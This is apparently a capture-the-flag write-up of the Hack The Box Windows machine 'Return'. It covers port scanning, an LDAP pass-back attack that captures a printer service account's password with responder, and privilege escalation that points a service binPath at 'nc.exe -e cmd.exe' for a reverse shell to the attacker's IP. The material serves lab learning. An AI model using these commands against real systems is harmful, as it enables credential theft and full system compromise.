# Box: Return
# Level: Easy
# OS: Windows
<hr>

Lets get started

# Recon

## PortScanning

command:```sudo nmap -A 10.129.88.241 -p- -v -T4```

```
Nmap scan report for 10.129.88.241
Host is up (0.42s latency).
Not shown: 65458 closed tcp ports (reset), 51 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: HTB Printer Admin Panel
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-10-14 12:22:40Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49681/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
50865/tcp open  msrpc         Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94%E=4%D=10/14%OT=53%CT=1%CU=43018%PV=Y%DS=2%DC=T%G=Y%TM=652A84
OS:2C%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=101%TI=I%CI=I%II=I%SS=S%TS
OS:=U)SEQ(SP=105%GCD=1%ISR=101%TI=I%CI=RI%II=I%SS=S%TS=U)SEQ(SP=105%GCD=1%I
OS:SR=101%TI=RD%CI=I%II=I%TS=U)SEQ(SP=105%GCD=1%ISR=101%TI=RD%CI=RI%II=I%TS
OS:=U)SEQ(SP=105%GCD=2%ISR=101%TI=RD%CI=I%II=I%TS=U)OPS(O1=M53ANW8NNS%O2=M5
OS:3ANW8NNS%O3=M53ANW8%O4=M53ANW8NNS%O5=M53ANW8NNS%O6=M53ANNS)WIN(W1=FFFF%W
OS:2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M53ANW
OS:8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y
OS:%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR
OS:%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF
OS:=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80
OS:%CD=Z)

Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-10-14T12:24:21
|_  start_date: N/A
|_clock-skew: 18m33s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

TRACEROUTE (using port 995/tcp)
HOP RTT       ADDRESS
1   436.16 ms 10.10.16.1
2   231.29 ms 10.129.88.241

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Oct 14 13:06:04 2023 -- 1 IP address (1 host up) scanned in 2869.49 seconds
```
From our scan we have quite a number of ports opened. We\ll start our enumeration today from port 80


# Enumeration(Port 80)

Navigate to the webpage

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/64f03f1e-6136-4c05-afb4-b1a015eae14a)

We get this HTB Printer Admin Panel

Click on "Settings", you'll see this

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/7d4a38d9-2c47-4c16-9eee-ab20c042f988)

We can perform something called ```LDAP Pass-back``` attack against this printer. This is a common attack against network devices, such as printers. Lets exploit this hehe


# Exploitation

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/909ef243-ec00-408a-96d2-848ec437d8e5)

In this attack we can modify this server address to our IP, then we'll get the printer to connect to us instead, which would disclose the credentials. 

To do this, we will set responder to run on the interface connected to the vpn.

command:```sudo responder -I tun0```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/ea4cc4c9-8fe2-4098-945d-b9b1d8e5e028)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/34081969-6a59-43c8-9208-7f7b67bde4a4)


Now, lets go back to the webpage and try to update the settings

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/ef37a2ca-dfcd-43bf-a09e-e431cfe2e9a3)

Checking our listener

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/125c9f3b-51e7-474c-bbda-d9d024992009)

We were able to successfully capture the creds hehe😎.

Now lets connect to this using ```evil-winrm```.

command:```evil-winrm -u svc-printer -i 10.129.88.241 -p '1edFg43012!!'```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/83d6542b-65ff-4919-bfe8-18eb19a732ae)

soft!!😂. Lets go ahead to escalate our privileges



# Privilege Escalation

Checking the list of users on the computer

command:```net user svc-printer```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/e74cc2e7-6e59-4dd8-ae56-0f32ba3801e8)

Being a member of server operator group is not a vulnerability, but the member of this group has special privileges to make changes in the domain which could lead an attacker to escalate to system privilege.

You can check out this  [blog](https://www.hackingarticles.in/windows-privilege-escalation-server-operator-group/), it's well explained here.

Lets list services running on this server using the ```services``` command

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/42230f3b-36fa-4587-98d8-5e91abff7390)

We can see list of services are there. Then we noted the service name “VMTools” and service binary path for lateral usage.

Lets upload ```nc.exe``` to the target's machine

command:```upload nc.exe```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/3b7cbfdb-a71d-4723-a8dc-90de7c27cd56)

cool cool,

When we start any service then it will execute the binary from its binary path so if we replace the service binary with netcat or reverse shell binary then it will give us a reverse shell as a system user because the service is starting as a system on the compromised host

Now,

commands
```
sc.exe config VMTools binPath="C:\Users\svc-printer\Desktop\nc.exe -e cmd.exe 10.10.16.30 1337"
sc.exe stop VMTools
sc.exe start VMTools
```
Ensure you set up your netcat listener before starting the service again

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/9f0e1e00-edff-47b9-a491-242c38177eb3)

Nice stuff hehe, we spwned a shell as ```nt authority\system```.

That will be all for today
<br><br>
[Back To Home](../../index.md)

























































